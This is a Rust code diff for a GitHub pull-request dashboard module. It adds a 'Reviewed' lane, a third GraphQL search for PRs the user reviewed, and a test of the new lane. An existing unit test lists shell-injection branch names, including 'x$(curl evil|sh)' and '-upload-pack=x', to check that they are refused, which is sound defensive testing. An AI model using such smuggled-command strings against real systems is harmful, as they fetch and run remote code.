@@ -1,4 +1,5 @@
-// GitHub: one GraphQL call through the gh CLI returns your open PRs plus the ones waiting on you.
+// GitHub: one GraphQL call through the gh CLI returns your open PRs plus other people's on your plate: waiting
+// on your review, assigned to you, or reviewed by you and still open.
 // `Pr` is the contract the page, the prompts and this module share.
 use serde::{Deserialize, Serialize};
 use serde_json::Value;
@@ -60,6 +61,8 @@ pub enum Lane {
     #[default]
     Ready,
     Waiting,
+    /// Someone else's PR you reviewed, no longer waiting on you; it stays until it is merged or closed.
+    Reviewed,
     Fix,
     Changes,
     Behind,
@@ -165,7 +168,9 @@ pub struct Snapshot {
     pub fetched_at: u64,
     pub login: String,
     pub mine: Vec<Pr>,
-    pub waiting: Vec<Pr>,
+    /// Other people's open PRs, in lane Waiting (your review is requested, or it is assigned to you) or
+    /// Reviewed (you reviewed it).
+    pub others: Vec<Pr>,
     /// A GraphQL error that left part of the data out; the rest is still shown.
     pub warning: Option<String>,
     /// GitHub is still working out whether one of your PRs can merge, so a refetch soon will differ.
@@ -174,7 +179,7 @@ pub struct Snapshot {
 
 impl Snapshot {
     pub fn find(&self, url: &str) -> Option<&Pr> {
-        self.mine.iter().chain(&self.waiting).find(|p| p.url == url)
+        self.mine.iter().chain(&self.others).find(|p| p.url == url)
     }
 }
 
@@ -193,10 +198,11 @@ const FIELDS: &str = r#"
 
 fn query() -> String {
     format!(
-        r#"query($q1: String!, $q2: String!) {{
+        r#"query($q1: String!, $q2: String!, $q3: String!) {{
   viewer {{ login pullRequests(states: OPEN, first: 100, orderBy: {{field: UPDATED_AT, direction: DESC}}) {{ nodes {{ {FIELDS} }} }} }}
   reviews: search(query: $q1, type: ISSUE, first: 50) {{ nodes {{ ... on PullRequest {{ {FIELDS} }} }} }}
   assigned: search(query: $q2, type: ISSUE, first: 50) {{ nodes {{ ... on PullRequest {{ {FIELDS} }} }} }}
+  reviewed: search(query: $q3, type: ISSUE, first: 50) {{ nodes {{ ... on PullRequest {{ {FIELDS} }} }} }}
 }}"#
     )
 }
@@ -368,16 +374,16 @@ pub fn parse_snapshot(doc: &Value) -> Result<Snapshot, String> {
         pr.lane = classify(pr, &stale_cutoff, &fresh_cutoff);
         pr.admin_mergeable = pr.admin_merge_refusal().is_none();
     }
+    // Each PR is listed once, in the first list that has it: a reviewed PR whose review is requested again waits.
     let mut seen: HashSet<String> = mine.iter().map(|p| p.url.clone()).collect();
-    let waiting: Vec<Pr> = [nodes("/data/reviews/nodes"), nodes("/data/assigned/nodes")]
-        .concat()
+    let others: Vec<Pr> = [("/data/reviews/nodes", Lane::Waiting), ("/data/assigned/nodes", Lane::Waiting), ("/data/reviewed/nodes", Lane::Reviewed)]
         .iter()
-        .filter(live)
-        .filter(|n| n["url"].as_str().is_some_and(|u| seen.insert(u.to_string())))
-        .map(|n| Pr { lane: Lane::Waiting, ..to_pr(n) })
+        .flat_map(|&(ptr, lane)| nodes(ptr).into_iter().map(move |n| (n, lane)))
+        .filter(|(n, _)| live(&n) && n["url"].as_str().is_some_and(|u| seen.insert(u.to_string())))
+        .map(|(n, lane)| Pr { lane, ..to_pr(&n) })
         .collect();
     let settling = mine.iter().any(|p| p.mergeable == Mergeable::Unknown);
-    Ok(Snapshot { fetched_at: now, login: text(doc, "/data/viewer/login"), mine, waiting, warning, settling })
+    Ok(Snapshot { fetched_at: now, login: text(doc, "/data/viewer/login"), mine, others, warning, settling })
 }
 
 pub async fn fetch_prs() -> Result<Snapshot, String> {
@@ -388,6 +394,7 @@ pub async fn fetch_prs() -> Result<Snapshot, String> {
             "api", "graphql", "-f", &q,
             "-f", "q1=is:open is:pr archived:false review-requested:@me",
             "-f", "q2=is:open is:pr archived:false assignee:@me -author:@me",
+            "-f", "q3=is:open is:pr archived:false reviewed-by:@me -author:@me",
         ],
         Duration::from_secs(60),
     )
@@ -536,6 +543,15 @@ mod tests {
     }
 
     #[test]
+    fn a_reviewed_pr_stays_until_closed_and_waits_again_when_re_requested() {
+        let pr = |n: u64| json!({ "url": format!("https://github.com/o/r/pull/{n}"), "repository": { "isArchived": false } });
+        let doc = json!({ "data": { "viewer": { "login": "me", "pullRequests": { "nodes": [pr(1)] } },
+            "reviews": { "nodes": [pr(2)] }, "assigned": { "nodes": [] }, "reviewed": { "nodes": [pr(1), pr(2), pr(3)] } } });
+        let lanes: Vec<(String, Lane)> = parse_snapshot(&doc).unwrap().others.into_iter().map(|p| (p.url, p.lane)).collect();
+        assert_eq!(lanes, [("https://github.com/o/r/pull/2".into(), Lane::Waiting), ("https://github.com/o/r/pull/3".into(), Lane::Reviewed)]);
+    }
+
+    #[test]
     fn shell_payloads_in_branch_names_are_refused() {
         assert!(safe_ref("claude/fix-ci_2.0"));
         for bad in ["x$(curl evil|sh)", "-upload-pack=x", "a;b", "a`b`", "a b", "a..b", ""] {
@@ -669,7 +685,7 @@ mod tests {
         let snap = parse_snapshot(&doc).unwrap();
         assert_eq!(snap.mine[1].mergeable, Mergeable::Unknown);
         assert!(snap.settling);
-        assert_eq!(snap.waiting[0].lane, Lane::Waiting);
+        assert_eq!(snap.others[0].lane, Lane::Waiting);
     }
 
     #[test]
